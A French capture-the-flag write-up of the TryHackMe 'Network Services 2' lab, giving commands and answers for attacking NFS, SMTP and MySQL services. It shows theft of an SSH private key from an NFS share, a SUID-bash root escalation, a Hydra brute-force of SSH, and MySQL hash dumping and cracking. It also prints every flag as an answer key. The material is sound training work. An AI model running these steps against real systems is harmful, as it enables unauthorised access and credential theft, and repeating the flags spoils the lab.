# TryHackMe: Network Services 2

**Objectif :** poursuivre l'apprentissage de l'exploitation des services reseau en travaillant cette fois sur NFS, SMTP et MySQL, avec des phases d'enumeration, d'acces initial et de recuperation de flags pour chaque protocole.

---

## Introduction

La room **Network Services 2** prolonge directement **Network Services**. Cette fois, les trois services mis en avant sont :

- NFS
- SMTP
- MySQL

Comme dans la premiere room, on ne suit pas une seule chaine d'attaque. On travaille plutot trois mini-laboratoires, chacun centre sur un protocole qu'on rencontre regulierement en pentest.

L'interet pedagogique est tres bon, parce qu'on revoit a chaque fois la meme logique :

1. comprendre le service
2. l'enumerer
3. identifier la mauvaise configuration
4. l'exploiter proprement

---

## Task 1: Get Connected

### Question: Read the above and connect to the network.

### Reponse

`Done`

---

## Task 2: Understanding NFS

Cette partie est theorique et pose les bases de NFS.

### Question 1: What does NFS stand for?

### Reponse

**NFS stands for:** `Network File System`

### Question 2: What process allows an NFS client to interact with a remote directory as though it was a physical device?

### Reponse

**Process:** `mounting`

### Question 3: What does NFS use to represent files and directories on the server?

### Reponse

**Representation:** `file handle`

### Question 4: What protocol does NFS use to communicate between the server and client?

### Reponse

**Protocol used:** `RPC`

### Question 5: What two pieces of user data does the NFS server take as parameters for controlling user permissions?

La room insiste sur deux identifiants systeme :

- UID
- GID

### Reponse

**User data used for permissions:** `uid and gid`

### Question 6: Can a Windows machine share files with NFS? (Y/N)

### Reponse

**Windows can share via NFS?** `Y`

---

## Task 3: Enumerating NFS

On passe a la cible NFS.

### Question 1: Conduct a thorough port scan scan of your choosing, how many ports are open?

Je lance :

```bash
nmap -sC -sV -p- <IP>
```

Le scan remonte :

```text
7
```

### Reponse

**Open ports:** `7`

### Question 2: Which port contains the service we're looking to enumerate?

Le service NFS se trouve sur :

```text
2049
```

### Reponse

**NFS port:** `2049`

### Question 3: use showmount ... what is the name of the visible share?

Je liste les exports :

```bash
showmount -e <IP>
```

L'export visible est :

```text
/home
```

### Reponse

**Visible share:** `/home`

### Question 4: Change directory to where you mounted the share- what is the name of the folder inside?

Je monte le partage :

```bash
mkdir /tmp/mount
sudo mount -t nfs <IP>:home /tmp/mount/ -nolock
ls /tmp/mount
```

Le dossier visible est :

```text
cappucino
```

### Reponse

**Folder inside mounted share:** `cappucino`

### Question 5: Have a look inside this directory...

### Reponse

`Done`

### Question 6: Which of these folders could contain keys that would give us remote access to the server?

En listant les fichiers caches :

```bash
ls -al /tmp/mount/cappucino
```

le dossier pertinent est :

```text
.ssh
```

### Reponse

**Folder containing keys:** `.ssh`

### Question 7: Which of these keys is most useful to us?

La cle privee interessante est :

```text
id_rsa
```

### Reponse

**Most useful key:** `id_rsa`

### Question 8: Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

Je recopie la cle, je fixe ses permissions :

```bash
cp /tmp/mount/cappucino/.ssh/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa cappucino@<IP>
```

L'authentification reussit.

### Reponse

**Can we log in via SSH with the key?** `Y`

---

## Task 4: Exploiting NFS

La room montre ici un cas classique : `no_root_squash` ou une configuration NFS trop permissive qui permet de deposer un binaire SUID depuis la machine locale.

### Question 1: First, change directory to the mount point...

### Reponse

`Done`

### Question 2: Download the bash executable ... copy the bash executable to the NFS share

La methode proposee par la room consiste a recuperer une copie de `bash`, puis a la deposer sur le partage monte :

```bash
cp ~/Downloads/bash /tmp/mount/cappucino/
sudo chown root /tmp/mount/cappucino/bash
```

### Reponse

`Done`

### Question 3: What letter do we use to set the SUID bit set using chmod?

### Reponse

**Letter for SUID bit:** `s`

### Question 4: What does the permission set look like?

Apres :

```bash
sudo chmod +s /tmp/mount/cappucino/bash
ls -la /tmp/mount/cappucino/bash
```

la reponse est :

```text
-rwsr-sr-x
```

### Reponse

**Permission set:** `-rwsr-sr-x`

### Question 5: ... Lets run it with "./bash -p"

Une fois reconnecte en SSH sur la machine, je verifie que `bash` est present puis je l'execute :

```bash
./bash -p
```

L'option `-p` preserve les privileges effectifs et permet d'obtenir un shell root grace au bit SUID.

### Reponse

`Done`

### Question 6: What's the root flag?

Je lis ensuite :

```bash
cat /root/root.txt
```

### Reponse

**NFS root flag:** `THM{nfs_got_pwned}`

---

## Task 5: Understanding SMTP

Cette partie revoit les bases du protocole SMTP.

### Question 1: What does SMTP stand for?

### Reponse

**SMTP stands for:** `Simple Mail Transfer Protocol`

### Question 2: What does SMTP handle the sending of? (answer in plural)

### Reponse

**SMTP handles:** `emails`

### Question 3: What is the first step in the SMTP process?

### Reponse

**First step:** `SMTP handshake`

### Question 4: What is the default SMTP port?

### Reponse

**Default SMTP port:** `25`

### Question 5: Where does the SMTP server send the email if the recipient's server is not available

### Reponse

**If recipient server unavailable:** `smtp queue`

### Question 6: On what server does the Email ultimately end up on?

### Reponse

**Email ends up on:** `POP/IMAP`

### Question 7: Can a Linux machine run an SMTP server? (Y/N)

### Reponse

**Linux can run SMTP?** `Y`

### Question 8: Can a Windows machine run an SMTP server? (Y/N)

### Reponse

**Windows can run SMTP?** `Y`

---

## Task 6: Enumerating SMTP

### Question 1: First, lets run a port scan ... What port is SMTP running on?

Je lance un scan basique, puis un scan plus complet si besoin :

```bash
nmap -sC -sV <IP>
```

Le service SMTP est bien sur :

```text
25
```

### Reponse

**SMTP port:** `25`

### Question 2: What command do we use to start Metasploit?

### Reponse

**Start Metasploit with:** `msfconsole`

### Question 3: Let's search for the module "smtp_version", what's it's full module name?

### Reponse

**smtp_version full module name:** `auxiliary/scanner/smtp/smtp_version`

### Question 4: Great, now- select the module and list the options. How do we do this?

La commande demandee est :

```text
options
```

### Reponse

**List module options:** `options`

### Question 5: What is the option we need to set?

### Reponse

**Option to set:** `RHOSTS`

### Question 6: ... What's the system mail name?

Une fois `RHOSTS` configure et le module execute, on obtient :

```text
polosmtp.home
```

### Reponse

**System mail name:** `polosmtp.home`

### Question 7: What Mail Transfer Agent (MTA) is running the SMTP server?

### Reponse

**MTA:** `Postfix`

### Question 8: Let's search for the module "smtp_enum", what's it's full module name?

### Reponse

**smtp_enum full module name:** `auxiliary/scanner/smtp/smtp_enum`

### Question 9: What option do we need to set to the wordlist's path?

### Reponse

**Wordlist option:** `USER_FILE`

### Question 10: Once we've set this option, what is the other essential paramater we need to set?

### Reponse

**Other essential parameter:** `RHOSTS`

### Question 11: Now, run the exploit ...

### Reponse

`Done`

### Question 12: Okay! Now that's finished, what username is returned?

L'enumeration SMTP retourne :

```text
administrator
```

### Reponse

**Returned username:** `administrator`

---

## Task 7: Exploiting SMTP

### Question 1: What is the password of the user we found during our enumeration stage?

Je brute force le compte `administrator` avec Hydra :

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP> ssh
```

Le mot de passe trouve est :

```text
alejandro
```

### Reponse

**Administrator password:** `alejandro`

### Question 2: Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

Je me connecte :

```bash
ssh administrator@<IP>
```

Puis :

```bash
cat smtp.txt
```

### Reponse

**smtp.txt:** `THM{who_knew_email_servers_were_c00l?}`

---

## Task 8: Understanding MySQL

Cette partie est theorique.

### Question 1: What type of software is MySQL?

### Reponse

**MySQL is a:** `relational database management system`

### Question 2: What language is MySQL based on?

### Reponse

**Language:** `SQL`

### Question 3: What communication model does MySQL use?

### Reponse

**Communication model:** `client-server`

### Question 4: What is a common application of MySQL?

### Reponse

**Common application:** `back end database`

### Question 5: What major social network uses MySQL as their back-end database?

### Reponse

**Major social network:** `Facebook`

---

## Task 9: Enumerating MySQL

### Question 1: What port is MySQL using?

### Reponse

**MySQL port:** `3306`

### Question 2: manually connect to the MySQL server

Les credentials utilises ici sont :

- utilisateur : `root`
- mot de passe : `password`

Je teste :

```bash
mysql -h <IP> -u root -p
```

### Reponse

`Done`

### Question 3: launch up Metasploit

### Reponse

`Done`

### Question 4: What three options do we need to set? (in descending order)

Avec le module `mysql_sql`, les trois options a renseigner sont :

```text
PASSWORD/RHOSTS/USERNAME
```

### Reponse

**Three options to set:** `PASSWORD/RHOSTS/USERNAME`

### Question 5: By default it will test with the "select version()" command, what result does this give you?

### Reponse

**select version() result:** `5.7.29-0ubuntu0.18.04.1`

### Question 6: Change the "sql" option to "show databases". how many databases are returned?

### Reponse

**Number of databases returned:** `4`

---

## Task 10: Exploiting MySQL

### Question 1: search for and select the "mysql_schemadump" module. What's the module's full name?

### Reponse

**mysql_schemadump full module name:** `auxiliary/scanner/mysql/mysql_schemadump`

### Question 2: What's the name of the last table that gets dumped?

### Reponse

**Last dumped table:** `x$waits_global_by_latency`

### Question 3: search for and select the "mysql_hashdump" module. What's the module's full name?

### Reponse

**mysql_hashdump full module name:** `auxiliary/scanner/mysql/mysql_hashdump`

### Question 4: What non-default user stands out to you?

### Reponse

**Interesting non-default user:** `carl`

### Question 5: What is the user/hash combination string?

### Reponse

**User/hash combination:** `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`

### Question 6: what is the password of the user we found?

Je copie la ligne dans `hash.txt`, puis :

```bash
john hash.txt
```

Le mot de passe cracke est :

```text
doggie
```

### Reponse

**Password for carl:** `doggie`

### Question 7: What's the contents of MySQL.txt

Je tente la reutilisation du mot de passe sur SSH :

```bash
ssh carl@<IP>
```

Puis :

```bash
cat MySQL.txt
```

### Reponse

**MySQL.txt:** `THM{congratulations_you_got_the_mySQL_flag}`

---

## Resume des reponses de la room

- Read the above and connect to the network `Done`
- What does NFS stand for? `Network File System`
- What process allows an NFS client to interact with a remote directory as though it was a physical device? `mounting`
- What does NFS use to represent files and directories on the server? `file handle`
- What protocol does NFS use to communicate between the server and client? `RPC`
- What two pieces of user data does the NFS server take as parameters for controlling user permissions? `uid and gid`
- Can a Windows machine share files with NFS? `Y`
- Conduct a thorough port scan ... how many ports are open? `7`
- Which port contains the service we're looking to enumerate? `2049`
- What is the name of the visible share? `/home`
- What is the name of the folder inside? `cappucino`
- Which folder could contain keys? `.ssh`
- Which key is most useful? `id_rsa`
- Can we log into the machine using ssh -i ... ? `Y`
- What letter do we use to set the SUID bit set using chmod? `s`
- What does the permission set look like? `-rwsr-sr-x`
- What's the root flag? `THM{nfs_got_pwned}`
- What does SMTP stand for? `Simple Mail Transfer Protocol`
- What does SMTP handle the sending of? `emails`
- What is the first step in the SMTP process? `SMTP handshake`
- What is the default SMTP port? `25`
- Where does the SMTP server send the email if the recipient's server is not available? `smtp queue`
- On what server does the Email ultimately end up on? `POP/IMAP`
- Can a Linux machine run an SMTP server? `Y`
- Can a Windows machine run an SMTP server? `Y`
- What port is SMTP running on? `25`
- Start Metasploit `msfconsole`
- smtp_version module name `auxiliary/scanner/smtp/smtp_version`
- List options `options`
- Option to set `RHOSTS`
- What's the system mail name? `polosmtp.home`
- What MTA is running? `Postfix`
- smtp_enum module name `auxiliary/scanner/smtp/smtp_enum`
- What option do we need to set to the wordlist's path? `USER_FILE`
- What is the other essential parameter we need to set? `RHOSTS`
- What username is returned? `administrator`
- What is the password of the user we found? `alejandro`
- What is contents of smtp.txt? `THM{who_knew_email_servers_were_c00l?}`
- What type of software is MySQL? `relational database management system`
- What language is MySQL based on? `SQL`
- What communication model does MySQL use? `client-server`
- What is a common application of MySQL? `back end database`
- What major social network uses MySQL as their back-end database? `Facebook`
- What port is MySQL using? `3306`
- What three options do we need to set? `PASSWORD/RHOSTS/USERNAME`
- select version() result `5.7.29-0ubuntu0.18.04.1`
- how many databases are returned? `4`
- mysql_schemadump module `auxiliary/scanner/mysql/mysql_schemadump`
- last dumped table `x$waits_global_by_latency`
- mysql_hashdump module `auxiliary/scanner/mysql/mysql_hashdump`
- What non-default user stands out to you? `carl`
- What is the user/hash combination string? `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`
- What is the password of the user we found? `doggie`
- What's the contents of MySQL.txt `THM{congratulations_you_got_the_mySQL_flag}`

---

## Conclusion

**Network Services 2** est une bonne suite logique a la premiere room. Elle montre bien que des services comme NFS, SMTP ou MySQL peuvent devenir des portes d'entree tres concretes des qu'ils sont mal exposes, mal configures ou accompagnés d'identifiants faibles. C'est exactement le type de fundamentals qu'il faut maitriser avant de vouloir aller sur des chaines plus exotiques.

***Auteur*** *: Saad Idrissi*
